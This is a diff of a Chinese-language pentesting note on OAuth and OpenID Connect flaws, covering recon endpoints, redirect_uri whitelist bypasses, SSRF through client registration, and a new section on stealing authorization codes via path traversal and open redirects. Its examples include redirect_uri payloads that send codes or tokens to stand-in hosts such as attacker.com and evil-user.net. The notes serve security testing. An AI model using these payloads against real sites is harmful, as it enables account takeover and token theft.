@@ -9,7 +9,32 @@ description: OAuth 测试思路
 >[!tip]
 > 目前处于待整理状态。
 
-## Recon
+## 发现
+
+- 授权请求报文
+- 第三方授权
+
+这些都是使用 OAuth 的信号。
+
+而且你还可以主动尝试访问下述端点：
+
+```
+/.well-known/oauth-authorization-server
+/.well-known/openid-configuration
+```
+
+如果存在，则是使用了 OAuth 的信号。
+
+针对 OpenID Connect 框架，部分可能存在“**支持但并未使用**”的情况，这点可通过在授权请求中添加：
+
+```http
+scope: openid
+response_type=id_token
+```
+
+通过观察响应是否出现错误来判断支持情况。
+
+## 侦察
 
 在 OAuth 场景中，你往往能通过 Icon、页面上的提示（微信登入、Googgle 账户登入等）以及域名获得 OAuth 提供商的信息。
 
@@ -55,9 +80,53 @@ OAuth 提供商往往会提供有关 OAuth 实现的详细文档，阅读该文�
 | 可向 URL 添加额外的值        | 利用不同组件间的解析差异，比如：`https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/`。                                |
 | 冗余 `redirect_uri`    | 出现冗余参数的时候，服务器会进行对应的处理（取前者、取后者、合并成数组……）。如果服务器和白名单逻辑最终处理的参数值不一致，则白名单的限制就失效了。                                         |
 | `localhost` 的特殊处理    | `localhost` 经常在开发环境中被使用。在某些情况中，对 `localhost` 开头的 `redirect_uri` 都会被允许，这使得攻击者可以构造类似 `localhost.evil.com` 这样的域名实现绕过。 |
-| 目录穿越                 | `redirect_uri` 不总是能绕过白名单限制，但是可以在当前白名单 URI 的基础上尝试目录穿越。该场景通常需要和其他漏洞配合，比如开放重定向。                                       |
+| 目录穿越                 | `redirect_uri` 不总是能绕过白名单限制，但是可以在当前白名单 URI 的基础上尝试目录穿越。该场景通常需要和其他漏洞配合，比如开放重定向，详见[[#通过代理页面窃取授权码和访问令牌|下一小节]]。                                       |
 
 **注意**，不要孤立地看 `redirect_uri` 参数，还要关注参数与参数之间的关系。比如当 `response_mode` 被设置为 `web_message` 的时候，代表 User-Agent（比如浏览器）上使用了辅助窗口来完成 OAuth 流程（想必大家都见过，当选择“使用 Google 账号完成登入”的时候，有时会弹出一个辅助窗口，OAuth 流程都在这个窗口中完成），在该情况中，为了方便跨窗口传递授权码等信息，授权服务器会访问 User-Agent 的 postMessage API 来实现信息传递，这可能需要在白名单中注册更多的信息，从而提供更多的可能。
+
+## 通过代理页面窃取授权码和访问令牌
+
+对于 `redirect_uri`，你不总是能绕过白名单的限制，但是可以在当前白名单 URI 的基础上尝试路径遍历：
+
+```
+https://client-app.com/oauth/callback/../../example/path
+```
+
+后端如果正确处理了点段，则重定向端点则变成了：
+
+```
+https://client-app.com/example/path
+```
+
+一旦你发现了这个现象，那么你就需要对能访问的页面进行审计，尝试发现一些能窃取授权码或者访问令牌的方法。
+
+该情景中，最有效的方法之一就是开放重定向，利用路径遍历将回调端点设置成存在开放重定向的端点并将重定向的地址指向攻击者的恶意服务器：
+
+```
+redirect_uri=https://client-app.com/oauth/callback/../../open?path=https://attacker.com
+```
+
+这样一来，授权服务器回调端点时，无论是授权码还是访问令牌都会拼接在恶意服务器的 URI 上：
+
+```
+https://client-app.com/oauth/callback/../../open?path=https://attacker.com?code=abcd……
+```
+
+触发开放重定向，访问：
+
+```
+https://attacker.com?code=abcd……
+```
+
+除开放重定向之外，还有两个常见的方法：
+
+| 方法              | 描述                                                                                                                                  |
+| --------------- | ----------------------------------------------------------------------------------------------------------------------------------- |
+| XSS             | 虽然 XSS 本身就能造成巨大的影响，但是针对 XSS 的限制比如 HttpOnly 增大了窃取 Cookie 的难度。但是如果利用 XSS 去窃取访问令牌或者授权码，部分针对 XSS 的限制会失效，从而提升 XSS 的影响。                   |
+| 参数、URL 片段的不安全传递 | 网站有时会实现参数或者 URL 片段传递，这可以被攻击者利用来获取访问令牌或者授权码。                                                                                         |
+| HTTP 注入         | 有些时候你无法注入 JS 代码但是可以注入 HTML，部分对外请求，在 Header 中可能会暴露授权码或者访问令牌的信息。比如 `<img src="evil-user.net">`，在 `Referer` 头中可能会暴露当前的 URL（其中可能含授权令牌）。 |
+
+**注意**，Burp Suite 并不会记录 `#` 后的 URL 片段，但这并不意味着用户浏览器上没有该 URL 片段。这是因为 URL 片段只在用户浏览器中传递。
 
 ## OpenID Connect 漏洞
 
@@ -128,57 +197,20 @@ Content-Length: xxx
 
 这些注册的信息，在后续 OAuth 的相关流程中可能被授权服务器所使用。比如 `logo_uri`，授权服务器可能会在某位置请求并展示客户端的 Logo 信息，这可能导致 SSRF（因为请求发起者是授权服务器）。
 
+#### 授权请求的其他提交方式
 
+在 OpenID Connect 中，授权请求所需要提交的参数可以通过 `request_uri` 指定一个 URI 来实现（参照[规范](https://openid.net/specs/openid-connect-core-1_0.html#RequestUriParameter)）。
 
+该 URI 会向资源服务器提供一个 JWT 格式的声明集（当然，大多数情况为 JWS/JWE 的形式）。
+
+对于常规授权请求，服务器可能进行了严格的防御，但是针对如上这样的非常规情况，服务器可能单纯依赖 JWS/JWE 所提供的密码学保证，但这并非一定安全（这并非本分类的讨论重点，详见 JWT 分类）。
 
 # 待整理部分
 
 
 
 
-#### 如何识别
 
-客户端应用程序若使用了 OpenID Connect，从授权请求中就能明显看出来（`scope: openid`……）。
-
-客户端有些时候可能支持 OpenID Connect 但目前并没有使用，因此可以尝试在授权请求中尝试添加：
-
-```
-scope: openid
-response_type=id_token
-```
-
-观察是否会导致错误。
-
-查看 OAuth 提供商的文档也是一种方法，看看是否有“支持 OpenID Connect”的相关信息。
-
-你可能还可以从标准端点 `/.well-known/openid-configuration` 尝试访问配置文件。
-
-### 识别 OAuth
-
-非当前应用的第三方连接器、登入方式等都是 OAuth 的信号。
-
-当然，还有更可靠的方式，即通过 HTTP 请求特征。在 OAuth 中，第一条请求总是客户端应应用向授权服务器的授权端点（比如 `/authorization`）发起请求，并且携带很多特殊的参数（前面提到过）：
-
-```http
-GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
-Host: oauth-authorization-server.com
-……
-```
-
-### Recon
-
-对 OAuth 服务进行侦察，能为后续的测试提供思路。
-
-从 OAuth 的流程中通常能确定授权服务器的提供商，它们往往会提供 API 的详细文档。
-
-另外，一旦确认授权服务器的主机名之后，应尝试请求下述端点：
-
-```
-/.well-known/oauth-authorization-server
-/.well-known/openid-configuration
-```
-
-这些端点通常会返回一个 JSON 格式的配置文件，里面也许会提供官方文档未提供的信息。
 
 ### OAuth 漏洞-客户端应用程序
 
@@ -290,46 +322,3 @@ client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callbac
 就以此确认了对应账号。
 
 但攻击者若能在 OAuth 提供商处注册与受害者同样的信息，客户端应用程序就会将攻击者误判为受害者。
-
-### OpenID Connect 漏洞
-
-#### 未受保护的动态客户端注册
-
-OpenID 提供了一种客户端向 OAuth 提供商注册的方式（常称为“动态客户端注册”）。
-
-该流程中，客户端会向 OAuth 提供商的客户端注册端口（根据 Recon 得到）发起类似这样的请求：
-
-```http
-POST /register HTTP/1.1
-Content-Type: application/json
-Accept: application/json
-Host: server.example.com
-
-{
- "redirect_uris": [
-   "https://client.example.org/callback",
-   "https://client.example.org/callback2"],
- "client_name": "My Example Client",
- "client_name#ja-Jpan-JP":
-    "\u30AF\u30E9\u30A4\u30A2\u30F3\u30C8\u540D",
- "token_endpoint_auth_method": "client_secret_basic",
- "logo_uri": "https://client.example.org/logo.png",
- "jwks_uri": "https://client.example.org/my_public_keys.jwks",
- "example_extension_parameter": "example_value"
-}
-```
-
->[!info]
-> 关于注册元信息列表，可以参照：[Client Metadata](https://datatracker.ietf.org/doc/html/rfc7591#section-2)。
-
-如果 OAuth 提供商支持开放注册（即无需初始访问令牌）则客户端会注册成功。
-
-这将导致任意客户端都可以向 OAuth 提交注册申请，而且客户端申请的参数中，可能会在后续的交互过程中被 OAuth 提供商所使用，这也许会产生不好的后果。
-
-比如注册元信息中的 `logo_uri`，OAuth 提供商可能会向该 URI 发起访问来获取 Logo 信息，如果攻击者在值中注入 OAuth 提供商内部 URI，则可能导致 SSRF。
-
-#### 授权请求的其他提交方式
-
-常规授权请求是通过查询字符串提交相关的参数，OpenID 提供了新的参数提交方式，即 JWT。
-
-所有需要的参数会被包括在 JWT 的 Payload 部分，通过 `request_uri` 参数来传递 JWT。部分授权服务器可能对常规查询参数具备良好的检测，但针对 JWT 却没有，导致出现各种问题。
